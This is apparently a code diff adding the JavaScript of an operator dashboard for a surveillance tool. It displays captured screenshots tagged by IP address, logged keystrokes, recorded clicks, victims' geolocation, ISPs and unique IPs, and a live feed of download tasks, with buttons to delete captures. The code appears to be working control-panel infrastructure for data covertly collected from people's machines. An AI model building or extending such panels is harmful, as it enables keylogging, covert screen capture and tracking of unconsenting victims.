+  $('#screenStrip').innerHTML=SCREENS.length?SCREENS.map(s=>`<div class="m" title="${s.ip||'?'}"><div class="del" onclick="deleteScreenshot(${s.id})">&times;</div><img src="/screenshots/${s.filename}" onclick="openPreview('/screenshots/${s.filename}','img')"><div class="ov">${s.ip||'?'}</div></div>`).join(''):'<div class="empty">No screenshots yet</div>';
+  $('#screenTotal').textContent=SCREENS.length;
+}
+
+/* keystrokes */
+function renderKeys(){
+  $('#keysBox').innerHTML=KEYS.length?KEYS.slice(0,300).map(k=>`<div><span class="kt">${fmt(k.time)}</span>${esc(k.keys)}</div>`).join(''):'<div class="empty">No keystrokes yet</div>';
+}
+
+/* clicks */
+function renderClicks(){
+  $('#clicksList').innerHTML=CLICKS.length?CLICKS.slice(0,200).map(c=>`
+    <div class="click-row">
+      <div class="cx"><i class="fa-solid ${iconFor(c.tag)}"></i></div>
+      <div class="ci"><b>${esc(c.text||c.tag||'click')}</b> <span style="color:var(--txt3)">on ${esc(c.page||'?')}</span></div>
+      <div class="cxy">${c.x||0},${c.y||0}</div>
+    </div>`).join(''):'<div class="empty">No clicks yet</div>';
+  $('#clickTotal').textContent=CLICKS.length;
+}
+function iconFor(tag){tag=(tag||'').toLowerCase();if(tag.includes('button'))return'fa-square';if(tag.includes('a')||tag.includes('link'))return'fa-link';if(tag.includes('img'))return'fa-image';if(tag.includes('input'))return'fa-keyboard';return'fa-hand-pointer';}
+
+/* geo */
+function renderGeo(g){
+  const dl=g.downloads||[], cap=g.captures||[];
+  const all=[...dl,...cap].filter(r=>r.lat&&r.lon).slice(0,40);
+  $('#locBox').innerHTML=all.length?all.map(r=>`<div class="geo-item"><i class="fa-solid fa-location-pin gpin"></i><div><div style="color:var(--txt)">${r.city||'?'}, ${r.country||'?'}</div><div style="color:var(--txt3);font-size:.56rem">${r.isp||''}</div></div><span class="gcoord">${Number(r.lat).toFixed(2)}, ${Number(r.lon).toFixed(2)}</span></div>`).join(''):'<div class="empty">No geo data yet</div>';
+  $('#locTotal').textContent=all.length;
+  const ips=STATS.unique_ips||[];
+  $('#ipBox').innerHTML=ips.length?ips.map(ip=>`<span class="ip-chip">${esc(ip)}</span>`).join(''):'<div class="empty">No data</div>';
+  $('#ipTotal').textContent=ips.length;
+}
+
+/* live tasks */
+function connectFeed(){
+  const box=$('#liveTasks'), cnt=$('#activeTaskCount');
+  try{
+    const es=new EventSource('/admin/events');
+    es.onmessage=e=>{try{
+      const d=JSON.parse(e.data); if(d.type!=='tasks')return;
+      const a=d.active||[]; cnt.textContent=a.length;
+      $('#liveTasksHint').textContent=a.length?`${a.length} running`:'idle';
+      if(!a.length){box.innerHTML='<div class="empty">No active downloads</div>';return;}
+      box.innerHTML=a.map(t=>{
+        const p=t.progress||0, err=t.error?` · ${esc(String(t.error).substring(0,40))}`:'';
+        return `<div class="task"><div class="t-top"><b>${esc(t.status||'?')}</b><span style="color:var(--green)">${p}%</span></div><div class="t-bar"><i style="width:${p}%"></i></div>${err?`<div style="font-size:.56rem;color:var(--red);margin-top:4px">${err}</div>`:''}</div>`;
+      }).join('');
+    }catch{}};
+    es.onerror=()=>{};
+  }catch{}
+}
+
+/* deletes */
+async function deleteCapture(id){ if(!confirm('Delete capture?'))return; const r=await fetch('/admin/captures/delete/'+id,{method:'POST'}).then(r=>r.json()); if(r.success)loadAll(); }
+async function deleteScreenshot(id){ if(!confirm('Delete screenshot?'))return; const r=await fetch('/admin/screenshot/delete/'+id,{method:'POST'}).then(r=>r.json()); if(r.success)loadAll(); }
+
+/* lazy load heavy views */
+const loaded={};
+$$('.nav-item').forEach(n=>n.addEventListener('click',async()=>{
+  const v=n.dataset.view; if(loaded[v])return; loaded[v]=true;
+  if(v==='captures'){CAPS=(await fetch('/admin/all').then(r=>r.json())).captures||[];renderCaptures();}
+  if(v==='screens'){SCREENS=(await fetch('/admin/all').then(r=>r.json())).screenshots||[];renderScreens();}
+  if(v==='keys'){KEYS=(await fetch('/admin/keystrokes').then(r=>r.json())).data||[];KEYS_COUNT=KEYS.length;renderKeys();renderOverview(STATS);}
+  if(v==='clicks'){CLICKS=STATS.clicks||[];renderClicks();}
+}));
+
+$('#refreshBtn').onclick=loadAll;
+loadAll(); setInterval(loadAll,12000);
+connectFeed();
 </script>
 </body>
 </html>
